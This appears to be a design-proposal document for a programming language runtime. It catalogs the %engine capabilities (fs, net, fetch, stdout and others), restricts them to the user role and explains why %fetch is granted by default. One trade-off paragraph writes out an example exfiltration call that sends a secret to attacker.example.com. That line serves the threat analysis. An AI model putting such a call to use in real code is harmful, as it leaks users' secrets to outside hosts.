# Idea: engine-granted capabilities

~~~vibecode
{"vibecode": {
	"doc": "ideas_globals_via_fetch",
	"role": "catalog of resources reached via %engine.X — the host-provided capabilities that touch the outside world (I/O, network, filesystem, subprocess). Because they have side effects, they're grant-governed: the host wired each one up at bootstrap and user code reaches them via the corresponding slot. Explicitly distinguishes them from `core:` — pure / side-effect-free capabilities (now, random, encryption) live under the core: URL scheme instead. The rule for what lives where: presence of side effects.",
	"key_concepts": ["engine_granted_resources", "side_effect_gating",
		"core_vs_engine_split"],
	"status": "design proposal — catalog and criterion settled. Companion `core:` design lives elsewhere.",
	"context": "this file was originally a broader design proposal covering governance separation, bare shortcuts, %engine.return, and per-page migration. Narrowed 2026-07-25 to just the engine-granted-capabilities catalog per issue #1292 — everything else is a separate concern and will land in its own doc."
}}
~~~

The canonical list of resources reached via `%engine.X`. Each represents a host-provided capability that **touches the outside world** — I/O, network, filesystem, subprocess. Because they have side effects, they're governed: the host wired them up at bootstrap, granted access under some role posture, and user code reaches them via the slot.

**Only the `user` role can call methods on `%engine`.** Any other role — a class-owned role, a downloaded-object role, a jailed frame — that tries to touch `%engine.X` (or the bracket form `%engine[key]`, or any bare shortcut like `%stdout`) raises. The gate is on `%engine` as a whole, not per-slot: a non-user frame can't reach any of it, no exceptions. If non-user code needs one of these capabilities, the `user`-role code that called it must take the resource off `%engine`, do whatever wrapping / narrowing / grant-shaping it wants, and pass the resulting reference across explicitly. The user is the actor; everything else is a tool the user hands down.

The bare shortcuts (`%stdout`, `%fs`, `%fetch`, etc.) are covered by the same gate — they're aliases for `%engine.X` and the gate check applies to the underlying access, not to the syntactic form. Writing `%stdout.puts` from a non-user frame raises for the same reason `%engine.stdout.puts` does.

**Exception: `%fetch` is default-granted to all roles.** Loading libraries — which is what `%fetch` primarily does in practice — is common enough at every layer of a program that requiring an explicit grant everywhere would be endless ceremony. Downloaded classes routinely compose on other downloaded classes; a class published as `caspian.uno/some-widget` might depend on `caspian.uno/some-helper`, and the caller of the widget doesn't need to know or grant that. `%fetch` (and its shortcuts `%fetch` / `%(url)`) are reachable from any role without a grant.

The trade-off worth naming: default-granting `%fetch` gives downloaded code a way to reach arbitrary URLs — which could be used for outbound exfil (`%fetch('https://attacker.example.com/log?data=' + $secret)`), not just legitimate library loading. Accepted as the cost of the library-ecosystem ergonomics; the fact that `%fetch` only copies to the cache (doesn't execute, doesn't shell out, doesn't reach filesystem outside the cache) keeps the surface bounded. Users who want stricter reach can revoke `%fetch` on their `%chain` before calling into untrusted code.

Every engine-granted capability also has a **global-method shortcut** — a bare `%X` alias for `%engine.X`. Both names reach the same resource; use whichever reads better at the call site (the bare form is usually shorter and preferred where there's no ambiguity).

| Slot | Global |
|---|---|
| `%engine[key]` (read-only) | — |
| `%engine.argv` | `%argv` |
| `%engine.env` | `%env` |
| `%engine.fetch` | `%fetch`, `%(url)` |
| `%engine.forks` | `%forks` |
| `%engine.fs` | `%fs` |
| `%engine.http_client` | `%http_client` |
| `%engine.lua` | `%lua` |
| `%engine.net` | `%net` |
| `%engine.stderr` | `%stderr` |
| `%engine.stdin` | `%stdin` |
| `%engine.stdout` | `%stdout` |
| `%engine.tmp` | `%tmp` |
